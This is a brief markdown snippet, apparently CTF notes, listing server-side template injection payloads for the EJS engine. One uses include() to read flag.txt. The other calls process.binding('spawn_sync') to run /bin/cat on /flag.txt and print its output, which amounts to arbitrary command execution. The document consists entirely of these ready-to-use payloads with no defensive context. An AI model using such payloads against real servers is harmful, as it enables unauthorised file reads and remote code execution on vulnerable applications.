## SSTI

### EJS

```
<%= include("flag.txt") %>

<%= process.binding("spawn_sync").spawn({ args: ["cat", "/flag.txt"], file: "/bin/cat", stdio:[{type:"pipe",readable:!0,writable:!1},{type:"pipe",readable:!1,writable:!0},{type:"pipe",readable:!1,writable:!0}]}).stdout.toString() %>
```
